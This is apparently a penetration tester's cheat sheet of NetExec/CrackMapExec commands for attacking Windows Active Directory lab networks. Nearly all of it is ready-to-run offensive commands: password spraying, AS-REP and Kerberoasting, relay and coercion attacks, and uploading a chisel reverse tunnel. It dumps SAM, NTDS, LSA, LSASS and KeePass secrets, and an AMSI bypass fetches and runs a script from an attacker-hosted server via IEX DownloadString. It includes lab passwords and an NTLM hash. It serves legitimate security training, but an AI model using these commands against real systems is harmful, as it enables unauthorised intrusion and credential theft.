---
description: CrackMapExec | NetExec | NXC | Networking
---

# NetExec

Supported protocols

| Protocol | Port      |
| -------- | --------- |
| SMB      | 445       |
| WINRM    | 5985/5986 |
| MSSQL    | 1433      |
| LDAP     | 389       |
| SSH      | 22        |
| RDP      | 3389      |
| FTP      | 21        |

### <mark style="color:yellow;">Gather information</mark>

```powershell
# Information network
smb 192.168.133.0/24 

# Hosts signing disabled
smb 192.168.1.0/24 --gen-relay-list relayOutput.txt
```

### <mark style="color:yellow;">Null Session</mark>

```powershell
# Enum password policy
nxc smb 10.129.100.111 -u '' -p '' --pass-pol

# Enum users
nxc smb 10.129.203.121  -u '' -p '' --users

# Enum users show only usernames
nxc ldap 10.10.252.117 -u samuel.davies -p l6fkiy9oN --users > users3 && awk 'NR>1 {print $5}' users3

# Enumerating Users with --rid-brute
nxc smb 10.129.204.172  -u '' -p '' --rid-brute 6000
cat users.txt | grep SidTypeUser | cut -d "\\" -f 2 | cut -d " " -f 1 | grep -v \\$ > skusers.txt

# Enum shares
nxc smb 10.129.203.121 -u '' -p '' --shares 
nxc smb 10.129.203.121 -u guest -p '' --shares
```

### <mark style="color:yellow;">Password Spraying</mark>

```powershell
# Single password
nxc smb 10.129.203.121 -u users.txt -p pass123

# Password list
nxc smb 10.129.203.121 -u users.txt -p pass.txt

#n Continue on succes / local auth
nxc mssql 10.129.204.177 -u users.txt -p pass.txt --continue-on-succes --local-auth
```

### <mark style="color:yellow;">Find ASREPRoastable</mark>

```powershell
# Bruteforce
nxc ldap dc01.zencorp.local -u users.txt -p '' --asreproast asreproast.out

# Search with credentials
nxc ldap dc01.zencorp.local -u joe -p pass123 --asreproast asreproast.out
```

### <mark style="color:yellow;">Chisel with NXC</mark>

```sh
# Run chisel server on VM
./chisel server --reverse

# Upload chisel to target
nxc smb 10.129.204.146 -u Administrator -p 'IpreferanewP@$$' --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe --local-auth

# Run client
nxc smb 10.129.204.146 -u Administrator -p 'IpreferanewP@$$' -x "C:\Windows\Temp\chisel.exe client 10.10.15.68:8080 R:socks" --local-auth 
```

### <mark style="color:yellow;">Group Policy Objects</mark>

```powershell
# GPP Find Passwords
nxc smb 10.129.203.121 -u john -p pass123 -M gpp_password

# GPP Autologin
nxc smb 10.129.203.121 -u john -p pass123 -M gpp_autologin
```

### <mark style="color:yellow;">Modules</mark>

<pre class="language-powershell"><code class="lang-powershell"># For any module
nxc ldap -L
nxc winrm -L

# View options
<strong>nxc ldap -M user-desc --options 
</strong><strong>
</strong><strong># Get user descriptions
</strong>nxc ldap dc01.zencorp.local -u john -p pass123 -M user-desc
nxc ldap dc01.zencorp.local -u john -p pass123 -M user-desc -o KEYWORDS=pwd,admin

# Check group memberships
nxc ldap dc01.zencorp.local -u john -p pass123 -M groupmembership -o USER=joe
</code></pre>

### <mark style="color:yellow;">MSSQL</mark>

<pre class="language-powershell"><code class="lang-powershell"># Run SQL query
mssql 10.129.203.111 -u john -p pass123 -q "SELECT name FROM master.dbo.sysdatabases"

<strong># Run SQL query as MSSQL user
</strong>mssql 10.129.203.111 -u john -p pass123 --local-auth -q "SELECT name FROM master.dbo.sysdatabases"

# Login as DBA
mssql 10.129.203.111 -u john -p pass123 --local-auth

# Run commands
mssql 10.129.203.111 -u john -p pass123 --local-auth -x whoami

# Upload file
mssql 10.129.203.111 -u john -p pass123 --local-auth --put-file /etc/passwd C:/Users/Public/passwd

# Download file
mssql 10.129.203.111 -u john -p pass123 --local-auth --get-file C:/Windows/System32/drivers/etc/hosts hosts
</code></pre>

MSSQL privilege escalation

```powershell
# Show module options
mssql -M mssql_priv --options

# PrivEsc
mssql 10.129.203.111 -u john -p pass123 -M mssql_priv
mssql 10.129.203.111 -u john -p pass123 -M mssql_priv -o ACTION=privesc
```

### <mark style="color:yellow;">Find Kerberoastable accounts</mark>

```powershell
nxc ldap dc01.zencorp.local -u john -p 'pass123' --kerberoasting kerberoasting.out
```

### <mark style="color:yellow;">Spidering and information finding</mark>

```powershell
# Enum shares
nxc smb 10.129.203.121 -u john -p pass123 --shares

# Spider search for txt in filename
nxc smb 10.129.203.121 -u john -p pass123 --spider BACKUP --pattern txt

# Show current files/dirs
nxc smb 10.129.203.121 -u john -p pass123 --spider BACKUP --regex .

# Search for file content
nxc smb 10.129.203.121 -u john -p pass123 --spider BACKUP --content --regex Encrypt

# Download a file
nxc smb 10.129.203.121 -u john -p pass123 --share --get-file pwn.txt pwn.txt

# Download a file
nxc smb 10.129.203.121 -u john -p pass123 --share -put-file /etc/test test
```

#### Spider plus module

```powershell
# List all files
nxc smb 10.129.203.121 -u john -p pass123 -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL

# Download all files
nxc smb 10.10.221.197 -u svc-web-accounting-d -p 'H3r0n2024#!' -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL DOWNLOAD_FLAG=Tru
```

### <mark style="color:yellow;">Get hash with responder</mark>

```powershell
# Start Responder
sudo responder -I tun0

# Upload lnk file
nxc smb 172.16.1.10 -u john -p pass123 -M slinky -o SERVER=10.129.153.230 NAME=important
```

### <mark style="color:yellow;">NTLM Relay</mark>

For relay SMB Signing is essential, computers with signing enabled we can't relay to. Get list of systems with SMB Signing with `--gen-relay-list`.

```powershell
# Get relay list
nxc smb 172.16.1.0/24 --gen-relay-list relay.txt
sudo proxychains4 -q impacket-ntlmrelayx -t 172.16.1.1 -smb2support --no-http

# Use list to connect and get hashes
sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http

# Validate credentials
proxychains4 -q nxc smb 172.16.1.5 -u administrator -H 30b3783ce2abf1af70f77d0660cf3453 --local-auth
```

### <mark style="color:yellow;">Searchconnect-ms</mark>

```powershell
# Create file .searchConnector-ms
proxychains -q nxc smb 172.16.1.1 -u john -p pass123 -M drop-sc -o URL=\\\\10.10.11.10\\secret FILENAME=secret

# Listen with NLTM relay
sudo proxychains4 -q impacket-ntlmrelayx -t 172.16.1.1 -smb2support --no-http
```

### <mark style="color:yellow;">Enumeration</mark>

```powershell
# Logged on users
nxc smb 10.129.203.121 -u john -p pass123 --loggedon-users

# Filter user
nxc smb 10.129.203.121 -u john -p pass123 --loggedon-users --loggedon-users-filter julio

# Enumerate domain computers
nxc smb 10.129.203.121 -u john -p pass123 --computers

# Enumerate LAPS
nxc smb 10.129.203.121 -u john -p pass123 -M laps
nxc smb 10.129.203.121 -u john -p pass123 --laps
nxc smb 10.129.203.121 -u john -p pass123 --laps --sam

# Get usernames
nxc smb 10.129.203.121 -u john -p pass123 --rid-brute

# Localgroups
nxc smb 10.129.203.121 -u john -p pass123 --local-groups

# Domain groups
nxc smb 10.129.203.121 -u john -p pass123 --groups  

# Group members
nxc smb 10.129.203.121 -u john -p pass123 --groups Administrators
```

### <mark style="color:yellow;">LDAP and RDP enum</mark>

<pre class="language-bash"><code class="lang-bash"># Users and groups
crackmapexec ldap dc01.zencorp.htb -u robert -p pass@123 --users --groups

# PASSWD_NOTREQD Attribute
crackmapexec ldap dc01.zencorp.htb -u robert -p pass@123 --password-not-required

# Unconstrained Delegation
crackmapexec ldap dc01.zencorp.htb -u robert -p pass@123 --trusted-for-delegation

<strong># Get domain SID
</strong>crackmapexec ldap dc01.zencorp.htb -u robert -p pass@123 --get-sid
</code></pre>

### <mark style="color:yellow;">gMSA</mark>

```bash
# check accounts with gMSA privileges
crackmapexec ldap dc01.zencorp.htb -u robert -p pass@123 "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword"

# Get gMSA password
crackmapexec ldap dc01.zencorp.htb -u robert -p pass@123 --gmsa
```

### <mark style="color:yellow;">Command Execution</mark>

NXC uses wmiexec, atexec, smbexec, mmcexec. Also using smb, ssh or winrm.

```bash
# Execute command as local admin
crackmapexec smb dc01.zencorp.htb -u robert -p pass@123 --local-auth -x "net localgroup administrators" 

# Domain account
crackmapexec smb dc01.zencorp.htb -u robert -p pass@123 -x whoami

# Set Method
crackmapexec smb dc01.zencorp.htb -u robert -p pass@123 --exec-method smbexec -x whoami
```

#### AMSI bypass

```bash
# Download file with Modified Amsi ScanBuffer Patch
wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/shantanukhande-amsi.ps1 -q

# Create and host PS Script
echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.33/shantanukhande-amsi.ps1');" > amsibypass.txt
sudo python3 -m http.server 80

# Run AMSI bybpass
crackmapexec ldap dc01.zencorp.htb -u robert -p pass@123 -X '$PSVersionTable' --amsi-bypass amsibypass.txt
```

### <mark style="color:yellow;">Getting Hashes</mark>

```bash
# SAM credentials local users
crackmapexec smb dc01.zencorp.htb -u robert -p pass@123 --sam

# NTDS database from DC
crackmapexec smb dc01.zencorp.htb -u robert -p pass@123 --ntds
crackmapexec smb dc01.zencorp.htb -u robert -p pass@123 --ntds --user krbtgt

# LSA Secrets/Cached Credentials
crackmapexec smb dc01.zencorp.htb -u robert -p pass@123 --lsa

# LSASS
crackmapexec smb dc01.zencorp.htb -u robert -p pass@123 -M lsassy

# Procdump
crackmapexec smb dc01.zencorp.htb -u robert -p pass@123 -M procdump
```

Get DNS records

```sh
nxc ldap dc01.inlanefreight.htb -u julio -p Password1 -M get-network -o ALL=true
```

### <mark style="color:yellow;">KeePass</mark>

```sh
# Find config file
nxc smb dc01.inlanefreight.htb -u julio -p Password1 -M keepass_discover

# Get passwords
nxc smb dc01.zencorp.htb -u julio -p Password1 -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/david/AppData/Roaming/KeePass/KeePass.config.xml
```

### <mark style="color:yellow;">Vulnerabilty scanning</mark>

```sh
nxc -q smb 172.16.10.3 -M Zerologon
nxc -q smb 172.16.10.3 -M -M PetitPotam
nxc -q smb 172.16.10.3 -M nopac
nxc -q smb 172.16.10.3 -M dfscoerce
nxc -q smb 172.16.10.3 -M shadowcoerce --verbose
nxc -q smb 172.16.10.3 -M ms17-010
```

